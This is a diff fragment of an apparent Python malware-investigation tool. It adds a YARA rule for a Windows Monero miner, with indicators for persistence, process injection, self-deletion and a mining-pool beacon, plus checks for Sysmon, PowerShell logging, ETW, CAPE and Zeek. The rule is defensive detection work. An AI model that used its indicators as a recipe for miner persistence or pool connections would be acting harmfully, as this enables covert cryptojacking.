+        $color_dir = "\\System32\\spool\\drivers\\color\\" nocase
+        $random_exe = /[a-z]{8}\.exe/ nocase
+        
+        // Registry persistence indicators
+        $ctfmon = "ctfmon" nocase
+        $run_key = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
+        
+        // Service persistence indicators
+        $gupdatem = "gupdatem" nocase
+        $google_update = "Google Update Service" nocase
+        
+        // Scheduled task indicators
+        $ddriver = "Ddriver" nocase
+        $scheduled_task = "schtasks" nocase
+        
+        // Process injection indicators
+        $rundll32 = "rundll32.exe" nocase
+        $explorer = "explorer.exe" nocase
+        
+        // Network beacon indicators
+        $api_ipify = "api.ipify.org" nocase
+        $moneroocean = "gulf.moneroocean.stream" nocase
+        $stratum = "stratum+tcp://" nocase
+        
+        // Self-deletion indicators
+        $remove_item = "Remove-Item" nocase
+        $my_invocation = "$MyInvocation.MyCommand.Path" nocase
+        
+        // Obfuscation indicators
+        $high_entropy = /[\\x00-\\xff]{100,}/  // High entropy pattern
+        
+    condition:
+        uint16(0) == 0x5A4D and 
+        (
+            // Initial drop
+            (all of ($chrome_update, $powershell_download)) or
+            
+            // Self-copy
+            (all of ($color_dir, $random_exe)) or
+            
+            // Registry persistence
+            (all of ($ctfmon, $run_key)) or
+            
+            // Service persistence
+            (all of ($gupdatem, $google_update)) or
+            
+            // Scheduled task
+            (all of ($ddriver, $scheduled_task)) or
+            
+            // Process injection
+            (all of ($rundll32, $explorer)) or
+            
+            // Network beacon
+            (all of ($api_ipify, $moneroocean)) or
+            
+            // Self-deletion
+            (all of ($remove_item, $my_invocation)) or
+            
+            // Obfuscation
+            $high_entropy
+        )
+}
+"""
+        return yara_rule
+    
+    def setup_environment(self) -> Dict[str, Any]:
+        """Setup investigation environment."""
+        self.logger.info("Setting up investigation environment")
+        
+        setup_results = {
+            "sysmon_installed": False,
+            "powershell_logging_enabled": False,
+            "etw_tracing_enabled": False,
+            "cape_available": False,
+            "zeek_available": False
+        }
+        
+        try:
+            # Check Sysmon installation
+            setup_results["sysmon_installed"] = self._check_sysmon_installation()
+            
+            # Check PowerShell logging
+            setup_results["powershell_logging_enabled"] = self._check_powershell_logging()
+            
+            # Check ETW tracing
+            setup_results["etw_tracing_enabled"] = self._check_etw_tracing()
+            
+            # Check CAPE availability
+            setup_results["cape_available"] = self._check_cape_availability()
+            
+            # Check Zeek availability
+            setup_results["zeek_available"] = self._check_zeek_availability()
             
         except Exception as e:
             self.logger.error(f"Environment setup failed: {e}")
+            setup_results["error"] = str(e)
         
-        return results
+        return setup_results
     
-    def _run_static_analysis(self, target: str) -> Dict[str, Any]:
-        """Run static analysis module."""
-        if os.path.isfile(target):
-            return self.static_analysis(target)
-        else:
-            # For system targets, analyze suspicious files
-            return self.behavioral_analyzer.find_suspicious_files()
-    
-    def _run_behavioral_analysis(self, target: str) -> Dict[str, Any]:
-        """Run behavioral analysis module."""
-        return self.behavioral_analysis(system=True, registry=True, services=True, tasks=True)
-    
-    def _run_memory_analysis(self, target: str) -> Dict[str, Any]:
-        """Run memory analysis module."""
-        return self.memory_forensics(injection=True)
-    
-    def _run_network_analysis(self, target: str) -> Dict[str, Any]:
-        """Run network analysis module."""
-        return self.network_analysis(live=False)
-    
-    def _generate_findings(self, modules: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Generate findings from analysis modules."""
-        findings = []
-        
-        for module_name, module_results in modules.items():
-            if "findings" in module_results:
-                for finding in module_results["findings"]:
-                    finding["module"] = module_name
-                    findings.append(finding)
-        
-        return findings
-    
-    def _save_investigation_results(self, results: Dict[str, Any], output_dir: str):
-        """Save investigation results to file."""
-        import json
-        
-        results_file = os.path.join(output_dir, "investigation_results.json")
-        with open(results_file, 'w') as f:
-            json.dump(results, f, indent=2, default=str)
-        
-        self.logger.info(f"Investigation results saved to {results_file}")
-    
-    def _analyze_static_findings(self, results: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Analyze static analysis results for findings."""
-        findings = []
-        
-        # Check entropy
-        if results.get("entropy", 0) > self.config.get("detection.thresholds.entropy", 7.5):
-            findings.append({
-                "type": "high_entropy",
-                "severity": "medium",
-                "description": f"File has high entropy: {results['entropy']}",
-                "evidence": results["entropy"]
-            })
-        
-        # Check signature
-        if results.get("signature_status") == "invalid":
-            findings.append({
-                "type": "invalid_signature",
-                "severity": "high",
-                "description": "File has invalid digital signature",
-                "evidence": results["signature_status"]
-            })
-        
-        # Check YARA matches
-        for match in results.get("yara_matches", []):
-            findings.append({
-                "type": "yara_match",
-                "severity": "high",
-                "description": f"YARA rule matched: {match['rule']}",
-                "evidence": match
-            })
-        
-        return findings
-    
-    def _setup_sysmon(self) -> bool:
-        """Setup Sysmon monitoring."""
+    def _check_sysmon_installation(self) -> bool:
+        """Check if Sysmon is installed."""
         try:
-            # This would typically involve installing and configuring Sysmon
-            # For now, we'll just check if it's available
-            self.logger.info("Sysmon setup would be implemented here")
-            return True
+            # Check if Sysmon service exists
+            cmd = ["sc", "query", "SysmonDrv"]
+            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            return process.returncode == 0
         except Exception as e:
-            self.logger.error(f"Sysmon setup failed: {e}")
+            self.logger.error(f"Sysmon check failed: {e}")
             return False
     
-    def _setup_etw_tracing(self) -> bool:
-        """Setup ETW tracing."""
+    def _check_powershell_logging(self) -> bool:
+        """Check if PowerShell logging is enabled."""
         try:
-            # This would typically involve configuring ETW providers
-            self.logger.info("ETW tracing setup would be implemented here")
-            return True
+            # Check PowerShell ScriptBlock logging
+            cmd = ["powershell", "-Command", "Get-GPO -All | Where-Object {$_.DisplayName -like '*PowerShell*'}" ]
+            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            return process.returncode == 0 and "PowerShell" in process.stdout
         except Exception as e:
-            self.logger.error(f"ETW tracing setup failed: {e}")
+            self.logger.error(f"PowerShell logging check failed: {e}")
             return False
     
-    def _setup_powershell_logging(self) -> bool:
-        """Setup PowerShell logging."""
+    def _check_etw_tracing(self) -> bool:
+        """Check if ETW tracing is enabled."""
         try:
-            # This would typically involve configuring PowerShell logging
-            self.logger.info("PowerShell logging setup would be implemented here")
-            return True
+            # Check ETW providers
+            cmd = ["logman", "query", "providers"]
+            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            return process.returncode == 0
         except Exception as e:
-            self.logger.error(f"PowerShell logging setup failed: {e}")
+            self.logger.error(f"ETW tracing check failed: {e}")
+            return False
+    
+    def _check_cape_availability(self) -> bool:
+        """Check if CAPE is available."""
+        try:
+            # Check if CAPE is installed
+            cmd = ["python3", "-c", "import cuckoo"]
+            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            return process.returncode == 0
+        except Exception as e:
+            self.logger.error(f"CAPE availability check failed: {e}")
+            return False
+    
+    def _check_zeek_availability(self) -> bool:
+        """Check if Zeek is available."""
+        try:
+            # Check if Zeek is installed
+            cmd = ["zeek", "--version"]
+            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            return process.returncode == 0
+        except Exception as e:
+            self.logger.error(f"Zeek availability check failed: {e}")
             return False
